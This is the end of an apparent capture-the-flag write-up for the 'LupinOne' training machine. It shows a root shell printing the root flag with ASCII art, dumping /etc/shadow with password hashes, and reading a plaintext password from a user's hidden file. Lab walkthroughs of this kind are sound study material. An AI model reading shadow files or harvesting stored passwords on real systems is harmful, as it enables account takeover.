-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x  3 root root 4096 Oct  4 08:49 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-------  1 root root   12 Oct  4 14:26 .python_history
-rw-r--r--  1 root root 3325 Oct  4 12:22 root.txt
drwx------  2 root root 4096 Oct  4 09:24 .ssh
root@LupinOne:~# cat root.txt 
*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(((((((((((((((((((((,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,                       .&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;(            /&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                       
,                    &amp;&amp;&amp;&amp;&amp;&amp;*                          @&amp;&amp;&amp;&amp;&amp;&amp;                   
,                *&amp;&amp;&amp;&amp;&amp;                                   &amp;&amp;&amp;&amp;&amp;&amp;                
,              &amp;&amp;&amp;&amp;&amp;                                         &amp;&amp;&amp;&amp;&amp;.             
,            &amp;&amp;&amp;&amp;                   ./#%@@&amp;#,                   &amp;&amp;&amp;&amp;*           
,          &amp;%&amp;&amp;          &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;**,**/&amp;&amp;(&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;             &amp;&amp;&amp;&amp;          
,        &amp;@(&amp;        &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;.....,&amp;&amp;*&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;             &amp;&amp;&amp;&amp;        
,      .&amp; &amp;          &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;      &amp;&amp;.&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;               &amp;%&amp;       
,     @&amp; &amp;           &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;      &amp;&amp; &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                @&amp;&amp;&amp;     
,    &amp;%((            &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;      &amp;&amp; &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                 #&amp;&amp;&amp;    
,   &amp;#/*             &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;      &amp;&amp; #&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;(                 (&amp;&amp;&amp;   
,  %@ &amp;              &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;      &amp;&amp; ,&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                  /*&amp;/  
,  &amp; &amp;               &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;      &amp;&amp;* &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                   &amp; &amp;  
, &amp; &amp;                &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;,     &amp;&amp;&amp; &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;(                   &amp;,@ 
,.&amp; #                #&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;(     &amp;&amp;&amp;.&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                   &amp; &amp; 
*&amp; &amp;                 ,&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;             &amp;(&amp;
*&amp; &amp;                 ,&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;            &amp; &amp;
*&amp; *              &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@.                 &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;             @ &amp;
*&amp;              &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@    &amp;&amp;&amp;&amp;&amp;/          &amp;&amp;&amp;&amp;&amp;&amp;                &amp; &amp;
*% .           &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@&amp;&amp;&amp;&amp;&amp;&amp;&amp;   &amp;  &amp;&amp;(  #&amp;&amp;&amp;&amp;   &amp;&amp;&amp;&amp;.                   % &amp;
*&amp; *            &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;   /*      @%&amp;%&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;    &amp;&amp;&amp;&amp;,                   @ &amp;
*&amp; &amp;               &amp;&amp;&amp;&amp;&amp;&amp;&amp;           &amp; &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;     @&amp;&amp;&amp;                   &amp; &amp;
*&amp; &amp;                    &amp;&amp;&amp;&amp;&amp;        /   /&amp;&amp;&amp;&amp;         &amp;&amp;&amp;                   &amp; @
*/(,                      &amp;&amp;                            &amp;                   / &amp;.
* &amp; &amp;                     &amp;&amp;&amp;       #             &amp;&amp;&amp;&amp;&amp;&amp;      @             &amp; &amp;.
* .% &amp;                    &amp;&amp;&amp;%&amp;     &amp;    @&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;.   %@&amp;&amp;*               ( @, 
/  &amp; %                   .&amp;&amp;&amp;&amp;  &amp;@ @                 &amp;/                    @ &amp;  
*   &amp; @                  &amp;&amp;&amp;&amp;&amp;&amp;    &amp;&amp;.               ,                    &amp; &amp;   
*    &amp; &amp;               &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp; &amp;    &amp;&amp;&amp;(          &amp;                   &amp; &amp;    
,     &amp; %           &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;(       .&amp;&amp;&amp;&amp;&amp;&amp;&amp;  &amp;                  &amp; &amp;     
,      &amp; .. &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;*          &amp;  &amp;                &amp; &amp;      
,       #&amp; &amp; &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;        &amp;.             %  &amp;       
,         &amp;  , &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;.     &amp;&amp;&amp;&amp;          @ &amp;*        
,           &amp; ,, &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;.  /&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;    &amp; &amp;@          
,             &amp;  &amp; #&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;  &amp;&amp;&amp;&amp;&amp;&amp;&amp;@ &amp;. &amp;&amp;            
,               &amp;&amp; /# /&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;# &amp;&amp;&amp;# &amp;# #&amp;               
,                  &amp;&amp;  &amp;( .&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;  &amp;&amp;  &amp;&amp;                  
/                     ,&amp;&amp;(  &amp;&amp;%   *&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%   .&amp;&amp;&amp;  /&amp;&amp;,                     
,                           &amp;&amp;&amp;&amp;&amp;/...         .#&amp;&amp;&amp;&amp;#                           

3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}
See you on the next heist.</code></pre>
<figure>
<img src="30.flag-root-txt.png" alt="" /><figcaption>30.flag-root-txt</figcaption>
</figure>
<h3 id="etcshadow">/etc/shadow</h3>
<pre class="shell"><code>root@LupinOne:~# cat /etc/shadow
root:$y$j9T$.Vm3maByMYHJ7GFXkaPl9.$GM/JEi6BrHIMq7PRdVSl9d3K9zoBIUqGQeWucmLxGr6:18904:0:99999:7:::
daemon:*:18904:0:99999:7:::
bin:*:18904:0:99999:7:::
sys:*:18904:0:99999:7:::
sync:*:18904:0:99999:7:::
games:*:18904:0:99999:7:::
man:*:18904:0:99999:7:::
lp:*:18904:0:99999:7:::
mail:*:18904:0:99999:7:::
news:*:18904:0:99999:7:::
uucp:*:18904:0:99999:7:::
proxy:*:18904:0:99999:7:::
www-data:*:18904:0:99999:7:::
backup:*:18904:0:99999:7:::
list:*:18904:0:99999:7:::
irc:*:18904:0:99999:7:::
gnats:*:18904:0:99999:7:::
nobody:*:18904:0:99999:7:::
_apt:*:18904:0:99999:7:::
systemd-timesync:*:18904:0:99999:7:::
systemd-network:*:18904:0:99999:7:::
systemd-resolve:*:18904:0:99999:7:::
messagebus:*:18904:0:99999:7:::
sshd:*:18904:0:99999:7:::
arsene:$y$j9T$gQc5hn21Z61HAMvXEAW67/$.Pbh2QLRi0wm/eD0DjSvVCcv04QnrFVhU75BtYRLED5:18904:0:99999:7:::
systemd-coredump:!*:18904::::::
icex64:$y$j9T$Q6btmipGCfpKncMhdsz45.$O0xCMB1kUwgMTo6xnVrLZZTt1kc.fIo.J4WipiU26V9:18904:0:99999:7:::</code></pre>
<h3 id="homearsene.secret">/home/arsene/.secret</h3>
<pre class="shell"><code>root@LupinOne:/home/arsene# cat .secret
I dont like to forget my password &quot;rQ8EE&quot;UK,eV)weg~*nd-`5:{*&quot;j7*Q&quot;</code></pre>
<p>Rooted!</p>
